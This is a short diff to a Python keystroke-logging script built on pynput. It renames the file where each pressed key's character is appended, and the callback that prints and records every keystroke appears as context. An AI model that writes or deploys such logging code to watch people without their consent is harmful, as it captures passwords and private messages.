@@ -2,7 +2,7 @@ from pynput import keyboard
 
 def keyClicked(key):
     print(str(key))
-    with open("keyfile.txt", 'a') as logKey:
+    with open("keystrokes.txt", 'a') as logKey:
         try:
             char = key.char
             logKey.write(char)
